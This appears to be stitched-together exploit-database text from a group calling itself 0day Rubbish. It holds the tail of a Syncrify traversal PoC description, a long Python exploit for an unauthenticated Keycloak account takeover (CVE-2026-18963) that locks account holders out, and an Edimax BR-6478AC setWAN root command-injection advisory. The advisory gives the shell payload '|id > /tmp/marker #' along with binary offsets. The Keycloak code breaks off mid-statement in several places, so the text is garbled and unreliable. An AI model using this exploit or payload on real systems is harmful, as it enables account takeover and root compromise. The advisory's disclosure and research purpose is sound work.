product/synametrics/syncrify-6.2/publiclink-chunk-upload-traversal-cron-root-rce/exploit/synametrics_syncrify_publiclink_chunk_upload_traversal_cron_root_rce.py Repository: https://github.com/Exploit-Garbage/0day-Rubbish The shipped proof of concept is Python 3 using only the standard library, with no third-party dependency and no hardcoded target. It takes host, port, scheme, front-controller route, operation and upload step; a mandatory backup-user credential pair with no default; and the command, marker path, fragment path, fragment user field, fragment schedule, traversal depth, scheduler wait and per-request timeout as arguments, defaulting to the loopback interface, port 5800, a depth of five and an identity capture. It offers an --insecure flag for self-signed TLS on the https scheme, a --control mode that performs the identical authenticated upload with a non-traversing chunk name and then asserts that neither the fragment path nor the marker path exists, a --proof-command argument that reads proof from a local command's standard output for an operator who already holds a shell channel to the host, an --expect-root flag that exits non-zero unless the recovered proof reports uid=0, and a --cleanup mode that removes only the two paths the script created. Nothing destructive is performed and no product file is overwritten or deleted. -- 0day Rubbish Research Team disclosure@0day-rubbish.com https://0day-rubbish.com

articles.full_text: # Exploit Title: Keycloak 26.7.2 - Unauthenticated Account Takeover # Date: 2026-10-15 # Exploit Author: Abel Maldonado | Orevim # Vendor Homepage: https://www.keycloak.org/ # Software Link: https://github.com/keycloak/keycloak/releases/tag/26.6.2 # Version: 26.0.0 - 26.4.14, 26.5.0 - 26.6.5, 26.7.0 - 26.7.1 # Tested on: Keycloak 26.6.2 (Docker, quay.io/keycloak/keycloak:26.6.2) # CVE: CVE-2026-18963 # Advisory: https://github.com/keycloak/keycloak/security/advisories/GHSA-4gv3-mc9p-5wqc # CWE: CWE-640 (Weak Password Recovery Mechanism for Forgotten Password) # Type: webapps # Platform: multiple # Repo: https://github.com/orevim/CVE-2026-18963-PoC # Research: https://orevim.co/research#cve-2026-18963 """Proof of concept and vulnerability check for CVE-2026-18963. CVE-2026-18963 is a reset-credentials flow bypass in Keycloak. An unscoped AUTHENTICATION_SELECTOR_SCREEN_DISPLAYED note lets an unauthenticated caller re-render the authenticator selection screen bound to the email execution. On an affected build that execution's action handler sets emailVerified and calls success() without checking the action token, so the flow reaches the update-password required action with no emailed link. Affected: >= 26.0.0 < 26.4.15, >= 26.5.0 < 26.6.6, >= 26.7.0 < 26.7.2. Patched in 26.4.15, 26.6.6 and 26.7.2; the 26.8.0 line ships with the fix. Three modes: --check decide whether the instance is affected, using a random identifier that resolves to nothing. Sends no mail and changes no account. --check --users ... additionally report which identifiers resolve. On an affected build a resolving identifier has emailVerified set as a side effect. --set-password complete the takeover. This locks the account holder out. Endpoints come from the realm's OIDC discovery document and form fields come from the forms themselves, so custom themes, custom paths and custom field names work without edits. Everything else is an option. Playwright is imported only when --open is used. """ from __future__ import annotations import argparse import base64 import dataclasses import enum import hashlib import http.client import http.cookiejar import html import json import os import random import re import secrets import socket import ssl import sys import time import urllib.error import urllib.parse import urllib.request from dataclasses import dataclass, field from html.parser import HTMLParser from pathlib import Path os.umask(0o077) # captures hold request and response material; keep them owner-only # Protocol defaults. Every one of these can be replaced from the command line. ("password-new", "password-confirm") HTML_ACCEPT = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" class Outcome(enum.Enum): NOT_VULNERABLE = "not-vulnerable" ACCOUNT_ABSENT = "account-absent" FORM_REACHED = "form-reached" PASSWORD_SET = "password-set" RATE_LIMITED = "rate-limited" INCONCLUSIVE = "inconclusive" @dataclass class Target: url: str | None = None realm: str | None = None discovery_url: str | None = None auth_url: str | None = None reset_url: str | None = None client_id: str | None = None redirect_uri: str | None = None scope: str = "openid" selector_field: str = SELECTOR_FIELD username_field: str = USERNAME_FIELD password_fields: tuple[str, ...] = PASSWORD_FIELDS address: str | None = None verify_tls: bool = True timeout: float = 30.0 user_agent: str | None = None headers: dict[str, str] = field(default_factory=dict) def __post_init__(self) -> None: if self.url: self.url = self.url.rstrip("/") if not (self.auth_url or self.discovery_url or (self.url and self.realm)): raise ValueError( "give --auth-url, or --discovery-url, or both --url and --realm" ) if not self.discovery_url and self.url and self.realm: realm = urllib.parse.quote(self.realm, safe="") self.discovery_url = f"{self.url}/realms/{realm}/{DISCOVERY_SUFFIX}" def origin_of(self, url: str) -> tuple[str, int]: parts = urllib.parse.urlsplit(url) port = parts.port or (443 if parts.scheme == "https" else 80) return parts.hostname or "", port @dataclass class Step: tag: str method: str url: str status: int location: str | None = None retries: int = 0 @dataclass class Result: outcome: Outcome identifier: str = "" steps: list[Step] = field(default_factory=list) form_url: str | None = None authorization_code: str | None = None session_cookies: list[str] = field(default_factory=list) detail: str = "" def as_dict(self) -> dict: data = dataclasses.asdict(self) data["outcome"] = self.outcome.value return data class ExploitError(RuntimeError): """The chain could not continue because a page did not carry what it needs.""" class RateLimited(RuntimeError): """The edge refused the request often enough that the run cannot continue.""" class Response: __slots__ = ("status", "headers", "body", "url", "retries") def __init__(self, status, headers, body, url, retries=0): self.status = status self.headers = headers self.body = body self.url = url self.retries = retries @property def location(self) -> str | None: return self.headers.get("Location") @dataclass class Form: action: str method: str fields: dict[str, str] def password_inputs(self) -> list[str]: return [name for name, value in self.fields.items() if value == "\x00password"] def body(self, overrides: dict[str, str]) -> str: data = { name: ("" if value.startswith("\x00") else fields. """ def __init__(self, base: str) -> None: super().__init__(convert_charrefs=True) self.base = base self.forms: list[Form] = [] self.links: list[str] = [] self._current: Form | None = None def handle_starttag(self, tag: str, attrs) -> None: values = {key.lower(): (value or "") for key, value in attrs} if tag == "form": action = urllib.parse.urljoin(self.base, values.get("action", "")) self._current = Form(action, values.get("method", "post").lower(), {}) self.forms.append(self._current) elif tag == "a" and values.get("href"): self.links.append(urllib.parse.urljoin(self.base, values["href"])) elif tag in ("input", "textarea", "select") and self._current is not None: name = values.get("name") if not name or values.get("type") in ("submit", "button", "image"): return if values.get("type") == "password": self._current.fields[name] = "\x00password" else: self._current.fields[name] = values.get("value") or "\x00empty" def handle_endtag(self, tag: str) -> None: if tag == "form": self._current = None def parse_page(body: str, base: str) -> _FormParser: parser = _FormParser(base) parser.feed(body) return parser def _unescape_js(value: str) -> str: value = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), value) return html.unescape(value.replace("\\/", "/")) def kc_context_url(body: str, key: str, base: str) -> str | None: """Read a URL out of the kcContext object a Keycloak theme embeds. A single page application theme renders no server-side form, so the action exists only in that object. Its keys are serialized as JSON, so one pattern is enough and avoids parsing the surrounding JavaScript. """ match = re.search(rf'["\']{re.escape(key)}["\']\s*:\s*"([^"]+)"', body) return urllib.parse.urljoin(base, _unescape_js(match.group(1))) if match else None def form_body(form: Form | None, overrides: dict[str, str]) -> str: return form.body(overrides) if form else urllib.parse.urlencode(overrides) class Pacer: """Space requests out and settle on a rate the edge tolerates. Retrying a 429 at the rate that caused it just earns another 429, so the interval grows on every throttle and stays grown. It shrinks back toward the requested rate only after a run of clean responses, and never goes faster than the rate asked for or slower than the floor. """ def __init__(self, rate: float = 0.5, floor_rate: float = 0.05, jitter: float = 0.25, max_retries: int = 4, slow_factor: float = 2.0, recover_after: int = 8, recover_factor: float = 1.4) -> None: self.min_interval = 1.0 / rate if rate > 0 else 0.0 self.max_interval = 1.0 / floor_rate if floor_rate > 0 else 600.0 self.interval = self.min_interval self.jitter = jitter self.max_retries = max_retries self.slow_factor = max(1.1, slow_factor) self.recover_after = recover_after self.recover_factor = max(1.01, recover_factor) self.throttled = 0 self.slowdowns = 0 self._streak = 0 self._last = 0.0 @property def rate(self) -> float: return 1.0 / self.interval if self.interval > 0 else 0.0 def wait(self) -> None: if self.interval <= 0: return gap = self.interval if self.jitter: gap *= 1.0 + random.uniform(-self.jitter, self.jitter) remaining = gap - (time.monotonic() - self._last) if remaining > 0: time.sleep(remaining) def mark(self) -> None: self._last = time.monotonic() def on_success(self) -> None: if self.interval <= self.min_interval: return self._streak += 1 if self._streak >= self.recover_after: self.interval = max(self.min_interval, self.interval / self.recover_factor) self._streak = 0 def on_throttle(self, retry_after: str | None) -> float: """Widen the interval and return how long to sleep before retrying.""" self.throttled += 1 self._streak = 0 widened = min(self.max_interval, max(self.interval, 1.0) * self.slow_factor) if widened > self.interval: self.slowdowns += 1 self.interval = widened if retry_after: try: return max(0.0, float(retry_after)) except ValueError: pass return self.interval def report(self) -> dict: return { "requested_rate": round(1.0 / self.min_interval, 4) if self.min_interval else 0.0, "effective_rate": round(self.rate, 4), "throttled": self.throttled, "slowdowns": self.slowdowns, } class _PinnedHTTPSConnection(http.client.HTTPSConnection): """Connect to a fixed address while keeping the Host header and SNI.""" def __init__(self, host, *, address, **kwargs): super().__init__(host, **kwargs) self._address = address def connect(self) -> None: self.sock = socket.create_connection((self._address, self.port), self.timeout) self.sock = self._context.wrap_socket(self.sock, server_hostname=self.host) class _PinnedHTTPSHandler(urllib.request.HTTPSHandler): def __init__(self, address: str, context: = 0 while True: self.pacer.wait() request = urllib.request.Request( url, data=data.encode() if data is not None else None, method=method ) request.add_header("Accept", accept) if self.target.user_agent: request.add_header("User-Agent", self.target.user_agent) for name, value in self.target.headers.items(): request.add_header(name, value) if data is not None: "loginResetCredentialsUrl", login.url ) if from_context: return from_context raise ExploitError( "the login page carries no reset-credentials link and no " "loginResetCredentialsUrl, so either password recovery is disabled or " "the theme renders it differently; pass --reset-url" ) @staticmethod def _action(response: Response, what: str) -> tuple[str, Form | None]: """Return where to post next, from the form or from kcContext. A single page application theme renders no form element, so the action lives only in kcContext. Without a form there are no fields to carry, and the caller posts only what it overrides. """ page = parse_page(response.body, response.url) if page.forms: return page.forms[0].action, page.forms[0] action = kc_context_url(response.body, "loginAction", response.url) if action: return action, None raise ExploitError(f"the {what} page carries no form and no loginAction") def _negative(self, identifier: str, detail: str) -> Result: """A negative verdict is only sound if nothing was throttled. A 429 mid-chain costs a backoff, and Keycloak expires the authentication session on its own clock, so a chain that resumes after a long sleep can return the page a patched build returns. Reporting that as not affected is the one failure mode a check tool must not have. articles.full_text: Title: Edimax BR-6478AC firmware v2.20 - authenticated command injection Author: 0day Rubbish Research Team Contact: disclosure@0day-rubbish.com Type: remote Platform: Hardware CVE: pending Description: Edimax BR-6478AC firmware image BR6478AC_v2.20.bin, the closed-source dual-band AC1750 SOHO wireless router from Edimax Technology Co., Ltd. (Taiwan), whose SquashFS root filesystem of roughly 2.3 MB targets MIPS 32-bit big-endian MIPS-I with a uClibc C library and carries an internal build timestamp from 2015, contains an OS command injection (CWE-78) in the WAN-configuration form handler of bin/webs, the embedded GoAhead-style HTTP server serving the management interface on TCP port 80. That binary is ELF 32-bit MSB MIPS, 762904 bytes, SHA256 ec39c0f9332361e37ab92f1999ac5f00f5742dd6db75f7cb26c0652cfedb32a1, reads etc/boa/boa.conf, writes /var/run/webs.pid and is kept alive by the boot path cleanlog.sh:131 invoked from init.sh:1115. The registration websFormDefine("setWAN", ...) at 0x478484, handler at 0x441cec, name string at 0x4a6250, publishes POST /goform/setWAN. Inside the handler the WAN mode is taken from the request and dispatched: websGetVar(wp, "wanMode", "") at 0x441d3c, atoi at 0x441d44, apmib_set(0x102, &wanMode) at 0x441d54, then addiu v1, zero, 2 at 0x441d60 and beq v0, v1, 0x441e74 at 0x441d6c. On the PPP branch, wanMode 2, the username field is read by websGetVar for pppUserName, name string at 0x4953f4, copied with strcpy at 0x441e94 into a fixed stack buffer, measured with strlen at 0x441ea8 and then scanned by an inline byte loop between 0x441ebc and 0x441ee4 whose only comparison is addiu a0, zero, 0x3b, a semicolon; finding one, the loop writes a NUL and stops. That single-character scan is the entire sanitisation on the path. The value is then formatted by sprintf at 0x441ee8 with the format string at 0x49a510, echo %s > /tmp/UserName, and passed to system(buf2) at 0x441f1c through the PLT slot at 0x4c6d60, which hands the line to /bin/sh -c. A pipe, an ampersand, a backtick, a dollar sign with parentheses and an embedded newline are never inspected, so a username containing no semicolon reaches the shell untouched: the payload |id > /tmp/marker # builds the command line "echo |id > /tmp/marker # > /tmp/UserName", in which the shell treats the hash as a comment swallowing the sink's own redirect and runs id as the right-hand side of a pipeline. An escape loop replacing a hash with a backslash-escaped hash does exist between 0x441f4c and 0x441fb0, but the instruction order places it after system() at 0x441f1c with no branch back to it, and it writes the configuration buffer at sp+0x18 that apmib_set(0x6d, ...) stores at 0x44200c rather than the buffer handed to the shell, so the hash character is escaped for storage and for nowhere near execution. Between websGetVar and system there is no regex call, no inet_aton, no isdigit, no isalnum, no strchr, no strcspn, no vendor validation helper and no custom validator; the inet_aton calls that do exist in the function, at 0x441dd0 and 0x441e14, belong to the static-IP branch, wanMode 1, reached via the branch at 0x441d8c, which the wanMode 2 comparison never enters, so a quick read of the decompilation misleads a reviewer into thinking this function validates addresses. The same construction appears three times in this handler and one root cause yields three reachable parameters: pppUserName on wanMode 2 with sink region 0x441e74 to 0x441f1c and configuration object 0x6d written after the sink, pptpUserName on wanMode 3 from 0x4420d0 onward with configuration object 0xf3, and L2TPUserName on wanMode 6 from 0x44246c onward with configuration object 0x128, each selected by a value the request supplies and each using the same immediate-0x3b scan, the same echo format string and the same system() call shape, so a patch confined to the PPP path leaves the PPTP and L2TP paths injectable. Reaching the handler requires a valid administrative session: the gate auth_authorize at 0x404d00 reads configuration object 0x1bc, the setup-wizard flag, through apmib_get, and once past setup the security store at 0x4c7004, a single / entry of type Basic registered from the directive Auth / /etc/boa/boa.passwd, covers every /goform/ path with HTTP Basic authentication. The product has no second lower-privileged role, so Privileges Required is High: one realm entry, one password file, one account, an Allow directive handler at 0x407688 that is a stub answering "This version of Boa doesn't support access controls", a type-None string at 0x49070c never passed to auth_add, and a shipped configuration carrying one Auth directive and no Allow directive. The route is not one of the four carrying a post-boot uptime gate, /mp.asp, /goform/mp, /advanced_management.asp and /goform/formAdvManagement, which redirect to /index.asp once /proc/uptime exceeds 600 seconds, so it is reachable at any time the device is up. The calling process is root because etc/boa/boa.conf declares User root, the server performs no setuid, chroot, namespace or capability drop and writes /var/run/webs.pid, which requires root on this filesystem, so the landing identity is uid=0(root) with no escalation step in the chain. This handler is one instance of a broad construction: a count of the shipped registration table found 91 /goform/form* handlers of which roughly 85 reach a system() or popen() call. Two adjacent observations are reported without a score: the strcpy at 0x441e94 copies attacker-controlled bytes with no length argument into a fixed stack buffer, for which no overflow was developed and no exploitability claim is made, and because the semicolon scan writes a NUL at the first semicolon a legitimate username containing one is silently truncated before storage, a correctness defect independent of the injection. The firmware image ships a populated /etc/boa/boa.passwd for the single realm and the model's published factory login is admin:1234; that is reported separately as CWE-798, carries no score, is never described as the vector for this injection, and no cryptographic match against the shipped MD5-crypt digest is claimed because the digest string captured during analysis was recorded incompletely. One detail is left unresolved rather than smoothed over: the single account entry in the image is recorded under the name root while the model's published management login is admin, and because no device was ever authenticated against, which user name the realm accepts was not established. Absence of privilege separation is likewise reported separately as CWE-250. A static comparison against a second firmware image, BR-6208AC_V2_1.03, whose webs is a different build, ELF 32-bit MSB MIPS-I, 816568 bytes, SHA256 3ad10a41d11c8cd59185eab6c9ce67b18cd2118942eb2201f48540d7846a0328, found a setWAN implementation matching instruction for instruction, handler at 0x448710, websGetVar for pppUserName at 0x4488b8, strcpy at 0x4488bc, the same inline immediate-0x3b scan at 0x4488dc to 0x4488fc, the same sprintf at 0x448920 with format string 0x4a6954, system() at 0x448940, the same three parameters on the same three wanMode values and the same single-realm Basic authentication behind the same configuration flag, which points to a shared source component in the vendor's router software base; that model was not tested, nothing was executed from that image, no score covers it and it is not an exploited finding on it. A second independent command injection on the same image, in the formWlanMP manufacturing-test handler reaching sprintf at 0x462fd0 and system() at 0x46308c through POST /goform/formWlanMP with no sanitisation across thirty radio-calibration fields, is published as a companion advisory; it is a different handler, format string, sink address and sanitiser, so one patch point does not close both. No prior public record was found whose root cause is command injection in this setWAN handler. CVSS: 7.2 High (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) is the single score published for this finding, from ISS = 1 - 0.44^3 = 0.914816, Impact at S:U = 6.42 x 0.914816 = 5.873119, Exploitability = 8.22 x 0.85 x 0.77 x 0.27 x 0.85 = 1.234708 and Base = Roundup(5.873119 + 1.234708) = Roundup(7.107826) = 7.2. The provenance of that figure is disclosed because it is a correction: the research notes carried 8.8 next to a PR:H vector, and 8.8 is the arithmetic of PR:L, so the score was recomputed from the vector and published at 7.2, lowering the researchers' own number by 1.6 points. Four further readings are printed with their arithmetic in the public analysis. Privileges Required Low is rejected at 8.8 High, Exploitability 2.835255 and Base Roundup(8.708373), because the product has no basic-user role. Scope Changed is rejected at 9.1 High, Impact at S:C 6.128026, Exploitability 2.286496 and Base Roundup(1.08 x 8.414522), because webs is root before the attack and root after it. Attack Complexity High is rejected at 6.6 High, Exploitability 0.705547 and Base Roundup(6.578666), because success depends on no condition outside the attacker's control, the only branch to satisfy, wanMode, being attacker-supplied. An adjacent-vector reading is published as a labelled alternative at 6.8 High, Exploitability 0.900610 and Base Roundup(6.773729), and is the honest description of a stock device whose WAN-side input policy drops new connections, the shipped firewall script dropping WAN-originated SYN at firewall.sh:180, installing a default DROP input policy at firewall.sh:187 and accepting input on other interfaces at firewall.sh:189; AV:N is retained because the service is bound to the device's own network stack and addressable over IP by every host on the segment the router serves, including guest wireless clients and anything bridged or compromised behind it, and because remote management on the WAN side or forwarding port 80 are ordinary documented features. Default internet exposure is not claimed. Two readings at 9.8 Critical, CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H from Exploitability 3.887043 and Base Roundup(9.760161), are published only as explicitly labelled conditionals and never as the headline: the first applies where a deployment still accepts the factory credential and is reasoned rather than demonstrated, since no device was authenticated against; the second applies to a device still in its pre-configuration setup state, where auth_authorize returns success without a challenge for paths outside /mp.asp, /index.asp and / at 0x4052d0 while /generate_204 answers 204, and that branch is structural inference only, read from the binary and never exercised, with three shipped artefacts identifying the state as the setup wizard rather than normal operation, namely formwizResetDefault at 0x44cdbc displaying Resettowizard, formWizSetup printing NO - LOGIN-WEB when the flag is 1, and pages such as web/inter_wan.asp:214 and web/admin_timezone.asp:95 reading the same flag. That conditional's Scope Changed variant computes to 10.0 and is deliberately not published, and if the setup window has to be contested rather than found open the reading is 8.1 High from Exploitability 2.221167 and Base 8.094286. No version range is claimed: only firmware BR6478AC_v2.20.bin was examined, and only the wanMode 2 path was replicated, so no claim is made for other BR6478AC builds, for the separately marketed BR-6478AC V2 hardware revision whose firmware line is a different little-endian MIPS-II build of webs, for the pptpUserName and L2TPUserName instances beyond the structural reading of the same handler, or for any other model. Impact: arbitrary operating-system command execution as root on the router from a single authenticated POST indistinguishable from a legitimate WAN settings submission, since the payload travels in the PPP username field of the form the product's own wan.asp page posts. Root on this device exposes every stored secret, including precisely the PPP, PPTP and L2TP credentials this handler writes into configuration objects 0x6d, 0xf3 and 0x128, so an attacker who reaches the device can read the ISP or VPN account details the owner entered, together with the administrator password file, wireless pre-shared keys and per-station key material, VPN parameters and any certificate or key on the filesystem. It grants control of the configuration and routing plane: firewall and NAT rules, the DNS resolver handed out to clients, DHCP leases and a malicious default gateway, port forwards, wireless SSIDs and the WAN uplink itself, including rewriting the WAN mode, which is exactly the configuration path this handler owns. It grants firmware-level persistence, since root can write the flash-backed configuration area and install a boot-time startup mechanism, so a compromise survives reboots and can survive a partial configuration reset, with recovery requiring a full reflash of a known-good image. It grants availability at will over wireless, routing, DHCP, DNS and the management service. There is no rate limit on the handler and no lockout in the Basic realm, so the route is repeatable and leaves no alert behind. Detection is poor by construction but this sink leaves one usable anomaly: a submitted WAN configuration produces ordinary behaviour and the sink's visible effect, a username written into /tmp/UserName and then into the configuration store, is what a legitimate submission does, so the indicator is the absence of the expected /tmp/UserName destination on a submission that should have created it. An injection also corrupts stored configuration in a way the owner may not notice, the semicolon scan truncating at the first semicolon and a pipe-and-hash payload storing a username the WAN link cannot authenticate with, a self-inflicted availability event that doubles as a fingerprint. One operational caution: the injection is not side-effect free. A successful submission overwrites the stored WAN username and can break the uplink, which is what the handler does on any successful submission, so any demonstration must record and restore the device's original WAN configuration. Verification boundary: no physical device was powered on and no end-to-end HTTP request was ever accepted by the product. The HTTP leg, being request parsing, the authentication gate, form registration, mode dispatch and PPP branch selection, is evidenced at instruction level from the shipped binary, its configuration and its boot scripts. The execution leg is evidenced dynamically by replication of the sink's semantics rather than by detonation, because a MIPS big-endian uClibc userspace with a board-specific bootloader could not be booted end to end in the research environment: the extracted binaries faulted with SIGBUS under the available user-mode translator and full-system emulation of the board was not brought up. The question under test is not the device but whether a shell evaluates a pipeline and honours a trailing comment in a string built by the vendor's own sprintf and handed to /bin/sh -c, which is a question about POSIX shell semantics that are architecture independent, combined with the exact format string read out of the binary. The string sprintf produces at 0x441ee8 was reconstructed byte for byte for a request whose pppUserName field is |id > /tmp/marker_sw # and handed to /bin/sh -c in an isolated POSIX sandbox whose invoking shell ran as root, producing a 39-byte marker file owned by root:root containing uid=0(root) gid=0(root) groups=0(root) with shell exit status 0, while the sink's own /tmp/UserName destination was not created, that absence being the proof that the trailing hash reached the shell as a comment rather than being escaped, since a protected sink would have left the file behind. A benign control submitting an ordinary username created its destination containing that username and produced no marker. The same replication was repeated on a workstation under an ordinary unprivileged user account and reproduced the semantics at that identity, ruling out the alternative explanation that running as root caused the marker to appear. The harness removes any pre-existing marker and destination before each run and deletes its scratch files afterwards. Consequently the on-device landing identity of uid=0(root) is inferred from the shipped User root directive plus the root-identity replication and is not an observation from hardware; AV:N is argued from the product's transport and authentication model rather than measured across a network; the pptpUserName and L2TPUserName instances are a structural reading of the same handler rather than a demonstrated result; the sibling-model comparison is static only with nothing executed from that image and no score covering it; no setup-state request was sent; no dictionary or credential attack was attempted; and no overflow was developed against the unbounded stack copy. Proof-of-concept and full analysis, published unconditionally: https://0day-rubbish.com/blog/edimax-br-6478ac-setwan-command-injection-root-rce Companion advisory, same product and image, different handler: https://0day-rubbish.com/blog/edimax-br-6478ac-formwlanmp-command-injection-root-rce PoC location in the public repository: product/edimax/br-6478ac-v2.20/setwan-command-injection-root-rce/exploit/edimax_br6478ac_setwan_command_injection_root_rce.py Repository: https://github.com/Exploit-Garbage/0day-Rubbish The shipped proof of concept is Python 3 using only the standard library, with no third-party dependency and no hardcoded target, and it is built so that it cannot be used accidentally against a live network. Its default mode is replication: it reconstructs the exact string the device's sprintf produces at 0x441ee8 and hands it to /bin/sh -c locally, asserting both that the injected pipeline ran and that the sink's own redirect target was not created, which is what proves the trailing hash reached the shell as a comment, then running a benign username as a negative control and asserting the opposite. That replication mode, not a device run, produced the evidence above. Arguments cover target host, Basic realm username and password, the WAN mode to select, which of the three username fields carries the payload, an option to iterate all three modes, a single non-destructive command defaulting to id, the marker path, the submit-url field value defaulting to /wan.asp, a user agent and a per-request timeout. A send mode additionally POSTs the request to the target and is refused for any non-loopback target unless an explicit allow-remote flag is given, and a print-request mode emits the exact HTTP request that would be transmitted while making no connection at all. Safety rails are loopback-only by default, one non-destructive marker command, no callback listener, no reverse shell, no persistence, and removal of every local file the run created. The tool's own documentation carries the warning that sending against a real device does change stored WAN configuration, because that is what the handler does on any successful submission, so the device's WAN settings must be restored afterwards. The model's published factory password appears in the tool only as a placeholder default so the request shape is self-documenting; the injection does not depend on it and the credential is reported as a separate weakness. Use only against systems you own or are authorised to test. -- 0day Rubbish Research Team disclosure@0day-rubbish.com https://0day-rubbish.com
